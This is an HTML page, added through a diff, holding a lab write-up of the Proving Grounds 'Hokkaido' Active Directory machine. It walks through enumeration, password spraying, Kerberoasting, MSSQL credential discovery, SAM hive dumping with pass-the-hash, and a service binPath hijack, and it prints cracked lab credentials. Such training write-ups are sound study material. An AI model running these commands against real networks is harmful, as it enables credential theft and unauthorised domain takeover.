@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="description" content="Hokkaido Proving Grounds writeup by Rachel Murphy - AD enumeration, Kerberoast, lateral movement and privilege escalation walkthrough." />
+  <title>PG: Hokkaido | Rachel Murphy</title>
+
+  <!-- Base site styling -->
+  <link rel="stylesheet" href="/assets/css/writeups.css">
+
+  <style>
+    /* small local tweaks for screenshots & code blocks */
+    img.screenshot {
+      max-width: 100%;
+      margin: 0.75rem 0;
+      border: 2px solid #39ff14;
+      border-radius: 6px;
+      display: block;
+    }
+    .code-block { margin: 1rem 0; background: rgba(0,0,0,0.04); padding: 0.6rem; border-radius: 6px; }
+    pre { margin: 0; padding: 0.6rem; background: #0f1724; color: #e6eef6; border-radius: 6px; overflow-x: auto; font-family: ui-monospace, "Roboto Mono", monospace; }
+    .machine-summary { margin-bottom: 1.5rem; }
+  </style>
+</head>
+<body>
+
+  <!-- Header -->
+  <header>
+    <h1>Hokkaido Writeup</h1>
+    <p>Proving Grounds — Active Directory exercise</p>
+    <nav>
+      <ul class="main-nav">
+        <li><a href="/index.html">Home</a></li>
+        <li><a href="/writeups/index.html">Writeups</a></li>
+        <li><a href="/cheatsheets/cheatsheet.html">Cheatsheets</a></li>
+        <li><a href="/tools/index.html">Tools</a></li>
+        <li><a href="/about.html">About</a></li>
+      </ul>
+    </nav>
+  </header>
+
+  <main class="wrap">
+
+    <section class="machine-summary">
+      <h2>Machine Overview</h2>
+      <p><strong>Difficulty:</strong> Beginner / Intermediate (popular OSCP practice VM)</p>
+      <p><strong>Platform:</strong> Offensive Security Proving Grounds</p>
+      <p><strong>Description:</strong> The Hokkaido VM is an Active Directory lab that simulates a small corporate network. The exercise focuses on AD enumeration, credential harvesting, Kerberoasting, lateral movement and privilege escalation techniques useful for real-world AD assessments and OSCP prep.</p>
+    </section>
+
+    <article>
+
+      <section>
+        <h2>NMAP</h2>
+        <p>Start with a standard service/version scan to discover running services and identify the domain names returned by the server.</p>
+
+        <div class="code-block">
+          <pre>sudo nmap -sC -sV 192.168.194.40 -oN nmap-hokkaido</pre>
+        </div>
+
+        <p>Results showed domain names and hostnames to add to <code>/etc/hosts</code> for easier testing:</p>
+        <div class="code-block">
+          <pre>hokkaido-aerospace.com
+dc.hokkaido-aerospace.com</pre>
+        </div>
+
+        <img class="screenshot" src="../images/Pasted image 20250708215541.png" alt="nmap output - hostnames">
+        <img class="screenshot" src="../images/Pasted image 20250708215624.png" alt="nmap - services">
+        <p>All-ports view and UDP scan to confirm nothing obvious on extra ports.</p>
+        <img class="screenshot" src="../images/Pasted image 20250708235142.png" alt="nmap all ports">
+        <img class="screenshot" src="../images/Pasted image 20250708235110.png" alt="nmap udp">
+      </section>
+
+      <section>
+        <h2>Web (HTTP)</h2>
+        <p>I ran directory busting to find hidden endpoints and possible upload or functionality that could lead to initial access.</p>
+
+        <div class="code-block">
+          <pre>feroxbuster -u http://192.168.194.40 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o ferox.out</pre>
+        </div>
+
+        <img class="screenshot" src="../images/Pasted image 20250708221332.png" alt="ferox results basic scan">
+        <p>Not much on the raw IP. Repeating with the virtual host / domain sometimes yields additional vhosts or routes — always try both.</p>
+        <img class="screenshot" src="../images/Pasted image 20250708221432.png" alt="ferox with domain">
+        <p>Retry with a larger/targeted wordlist by domain to see if different endpoints appear.</p>
+        <div class="code-block">
+          <pre>feroxbuster -u http://hokkaido-aerospace.com/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -o ferox2.out</pre>
+        </div>
+      </section>
+
+      <section>
+        <h2>SMB</h2>
+        <p>Quick SMB enumeration to check for anonymous shares and available content that might contain usernames or useful files.</p>
+
+        <img class="screenshot" src="../images/Pasted image 20250708220646.png" alt="smb share listing">
+        <img class="screenshot" src="../images/Pasted image 20250708220732.png" alt="smb results 2">
+        <p>SMB returned several shares — these are good places to look for credential files or user lists.</p>
+      </section>
+
+      <section>
+        <h2>RPC</h2>
+        <p>Using <code>rpcclient</code> can reveal users and group membership even without elevated privileges; it helps to identify accounts worth trying.</p>
+
+        <div class="code-block">
+          <pre>rpcclient -U '' -N 192.168.194.40</pre>
+        </div>
+
+        <img class="screenshot" src="../images/Pasted image 20250708220953.png" alt="rpcclient output logged in but no privs">
+        <p>Logged in but no privileged operations — still useful for enumeration and confirming presence of RPC services.</p>
+      </section>
+
+      <section>
+        <h2>LDAP</h2>
+        <p>LDAP queries can reveal directory structure and additional metadata. A quick anonymous bind or base query is a good initial step.</p>
+
+        <img class="screenshot" src="../images/Pasted image 20250708221243.png" alt="ldap scan results">
+        <p>No direct privileged info via LDAP in this test — still a check to rule out misconfigured directory access.</p>
+      </section>
+
+      <section>
+        <h2>Kerberos & Username Discovery</h2>
+        <p>Use Kerbrute (or other username discovery tools) to build a high-confidence username list. Valid usernames allow targeted attacks like Kerberoasting or password spraying.</p>
+
+        <div class="code-block">
+          <pre>kerbrute userenum -d hokkaido-aerospace.com --dc 192.168.194.40 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 100</pre>
+        </div>
+
+        <p>From initial probing we built a small users list:</p>
+        <div class="code-block">
+          <pre>info
+administrator
+discovery
+maintenance</pre>
+        </div>
+
+        <p>Testing these with SMB (NXC) using username-as-password lists quickly revealed valid creds.</p>
+        <div class="code-block">
+          <pre>nxc smb 192.168.194.40 -u users.txt -p users.txt</pre>
+        </div>
+
+        <img class="screenshot" src="../images/Pasted image 20250709000450.png" alt="nxc user:list result">
+        <p>Found a working pair: <code>info:info</code>. This account became our initial foothold for reading SMB shares.</p>
+      </section>
+
+      <section>
+        <h2>Read SMB Shares</h2>
+        <p>Mounting and reading accessible shares often yields usernames, scripts, or passwords. I used <code>smbclient</code> to inspect available shares.</p>
+
+        <div class="code-block">
+          <pre>smbclient -U 'info' //192.168.194.40/homes</pre>
+        </div>
+
+        <img class="screenshot" src="../images/Pasted image 20250709000746.png" alt="smbclient - homes share listing">
+        <p>The homes share contained a list of usernames — a goldmine for targeted attacks.</p>
+
+        <img class="screenshot" src="../images/Pasted image 20250709001225.png" alt="UpdateServicesPackages share empty">
+        <p>One share was empty; another contained a text file worth inspecting.</p>
+        <img class="screenshot" src="../images/Pasted image 20250709001331.png" alt="file in share showing usernames">
+        <p>I took the discovered usernames and re-ran Kerbrute or targeted checks to expand the userlist — many were valid.</p>
+        <img class="screenshot" src="../images/Pasted image 20250709001441.png" alt="kerbrute new user list validation">
+      </section>
+
+      <section>
+        <h2>Password Reset & Password Spray</h2>
+        <p>Inspecting NETLOGON and default shares sometimes reveals password reset templates or defaults. I located a password reset file containing a default password and used it for a targeted spray.</p>
+
+        <img class="screenshot" src="../images/Pasted image 20250709005346.png" alt="password reset file in NETLOGON share">
+        <img class="screenshot" src="../images/Pasted image 20250709005430.png" alt="password found in reset file">
+        <p>The file contained <code>Start123!</code>; I used that as a spray password against discovered users, which found a valid account: <code>discovery:Start123!</code>.</p>
+
+        <div class="code-block">
+          <pre>nxc smb 192.168.194.40 -u 'users-rpc.txt' -p 'Start123!'</pre>
+        </div>
+
+        <img class="screenshot" src="../images/Pasted image 20250709005702.png" alt="spray found discovery account">
+        <p>Confirming context — this account looked like a service/account suitable for Kerberoast or SPN requests.</p>
+      </section>
+
+      <section>
+        <h2>SPN Enumeration & Kerberoast</h2>
+        <p>When a user is a service account (or has SPNs), requesting service tickets and cracking them offline (Kerberoast) is a reliable path to obtain service account credentials.</p>
+
+        <div class="code-block">
+          <pre>impacket-GetUserSPNs -request -dc-ip 192.168.194.40 hokkaido-aerospace.com/discovery -save -outputfile GetUserSPNs.out</pre>
+        </div>
+
+        <p>SPNs discovered for accounts like <code>discover/dc.hokkaido-aerospace.com</code> and <code>maintenance/dc.hokkaido-aerospace.com</code>.</p>
+        <img class="screenshot" src="../images/Pasted image 20250709011043.png" alt="getuserspns output">
+        <img class="screenshot" src="../images/Pasted image 20250709011111.png" alt="captured krb hashes">
+        <p>Saved the hashes to file and attempted cracking with hashcat:</p>
+
+        <div class="code-block">
+          <pre>hashcat -m 13100 GetUserSPNs.out /usr/share/wordlists/rockyou.txt</pre>
+        </div>
+
+        <img class="screenshot" src="../images/Pasted image 20250709011310.png" alt="hashcat results">
+        <p>Some hashes failed to crack with the initial wordlist — I tried alternate tooling and ultimately used targeted Kerberoast for other users later in the flow.</p>
+      </section>
+
+      <section>
+        <h2>MSSQL Access & Impersonation</h2>
+        <p>Some service accounts allow MSSQL connections. If the MSSQL service accepts Windows auth, impersonation techniques may work to access databases and discover stored credentials.</p>
+
+        <div class="code-block">
+          <pre>impacket-mssqlclient 'hokkaido-aerospace.com/discovery':'Start123!'@192.168.194.40 -dc-ip 192.168.194.40 -windows-auth</pre>
+        </div>
+
+        <img class="screenshot" src="../images/Pasted image 20250709011952.png" alt="mssqlclient connection">
+        <p>Used available database functions like <code>xp_dirtree</code> and searched DBs for credentials. I discovered the <code>sysauth</code> table with credentials for an application account:</p>
+
+        <img class="screenshot" src="../images/Pasted image 20250709101205.png" alt="sysauth table with creds">
+        <div class="code-block">
+          <pre>hrapp-service:Untimed$Runny</pre>
+        </div>
+
+        <p>I tested these creds against WinRM and other services. When direct logins failed, I exported AD data to Bloodhound for relationship and privilege analysis.</p>
+      </section>
+
+      <section>
+        <h2>Bloodhound Analysis & Targeted Kerberoast</h2>
+        <p>Importing enumeration data into Bloodhound revealed relationships and potential privilege escalation paths (e.g., writable objects, group memberships). Using targeted Kerberoast against a target account in scope yielded a crackable TGS for <code>Hazel.Green</code>.</p>
+
+        <div class="code-block">
+          <pre>python3 targetedKerberoast.py -d 'hokkaido-aerospace.com' -u 'hrapp-service' -p 'Untimed$Runny'</pre>
+        </div>
+
+        <img class="screenshot" src="../images/Pasted image 20250709103328.png" alt="targeted kerberoast success">
+        <p>Saved the hash and cracked it with hashcat, yielding <code>Hazel.Green:haze1988</code>.</p>
+
+        <div class="code-block">
+          <pre>hashcat -m 13100 hazel.hash /usr/share/wordlists/rockyou.txt</pre>
+        </div>
+
+        <img class="screenshot" src="../images/Pasted image 20250709103624.png" alt="hazel cracked">
+      </section>
+
+      <section>
+        <h2>Attempt WinRM & Lateral Actions</h2>
+        <p>I tried WinRM/RDP with Hazel's credentials (and other methods) to get an interactive session. Some attempts failed (services might be restricted), but the creds allowed additional AD operations in context:</p>
+
+        <div class="code-block">
+          <pre>nxc winrm 192.168.194.40 -u 'Hazel.Green' -p 'haze1988'
+xfreerdp3 /u:hazel.green /p:haze1988 /cert:ignore /v:192.168.194.40</pre>
+        </div>
+
+        <img class="screenshot" src="../images/Pasted image 20250709103856.png" alt="winrm attempt failed">
+        <p>Where direct login didn't work, Bloodhound showed other ways Hazel's account could be leveraged — for example, modify certain service accounts or abuse group relationships.</p>
+      </section>
+
+      <section>
+        <h2>Privilege Escalation via SeBackupPrivilege</h2>
+        <p>Where an account has SeBackupPrivilege / SeRestorePrivilege, registry hives and NTDS can be exported and used to extract password hashes offline. This is a standard approach when those privileges are present.</p>
+
+        <div class="code-block">
+          <pre>reg save hklm\sam c:\Temp\sam
+reg save hklm\system c:\Temp\system</pre>
+        </div>
+
+        <p>After copying the saved hives to Kali, use Impacket's secretsdump to derive hashes and then authenticate as administrator using pass-the-hash.</p>
+
+        <div class="code-block">
+          <pre>impacket-secretsdump -system system -sam sam local
+evil-winrm -i 192.168.208.40 -u administrator -H "d752482897d54e239376fddb2a2109e4"</pre>
+        </div>
+      </section>
+
+      <section>
+        <h2>Alternate PrivEsc — Service Binary / BinPath Hijack</h2>
+        <p>If an account can change service configuration (binPath), you can point a service to execute commands as SYSTEM. Tools like AccessChk help identify which services a given account can control.</p>
+
+        <div class="code-block">
+          <pre>curl http://192.168.45.152/accesschk.exe -o accesschk.exe
+accesschk.exe -cuwqv "molly.smith" * /accepteula</pre>
+        </div>
+
+        <img class="screenshot" src="../images/Pasted image 20250709113544.png" alt="accesschk enumerating service access">
+        <p>Find a service the target account fully controls (e.g., <code>AppReadiness</code>) and update its binPath to run a command that adds the user to the local Administrators group.</p>
+
+        <div class="code-block">
+          <pre>sc qc AppReadiness
+accesschk.exe -cuwqv "molly.smith" AppReadiness
+sc config AppReadiness binPath= "cmd /c net localgroup Administrators molly.smith /add"
+sc stop AppReadiness
+sc start AppReadiness</pre>
+        </div>
+
+        <img class="screenshot" src="../images/Pasted image 20250709113734.png" alt="molly has privileges shown by accesschk">
+        <img class="screenshot" src="../images/Pasted image 20250709113815.png" alt="changed service binPath to add user to administrators">
+        <p>After the service runs the command, the account is added to Administrators. Log out and back in (or refresh token) and verify token privileges; then retrieve the final flags.</p>
+
+        <div class="code-block">
+          <pre>whoami &amp; type proof.txt &amp; ipconfig</pre>
+        </div>
+      </section>
+
+      <section>
+        <h2>Summary & Lessons Learned</h2>
+        <p>Hokkaido demonstrates a classic AD escalation chain: enumerate services and shares, harvest credentials, leverage SPNs/Kerberoast or MSSQL for credential discovery, use Bloodhound to plan lateral moves, and abuse privileged service accounts (SeBackup/SeManage/SeRestore) or service configuration to achieve SYSTEM-level control. Keep lookups, Bloodhound workflows, and resource access checks handy — small files (password resets, notes) and share contents are often the key to a fast pivot.</p>
+      </section>
+
+    </article>
+  </main>
+
+  <!-- Footer -->
+  <footer>
+    <div class="wrap site-footer">
+      <p>© Rachel Murphy 2025 | <a href="https://github.com/rachhavoc" target="_blank" rel="noopener">GitHub</a> | <a href="/about.html">About</a></p>
+      <p><a href="/writeups/index.html">Back to Writeups</a> | <a href="/index.html">Home</a></p>
+    </div>
+  </footer>
+
+</body>
+</html>
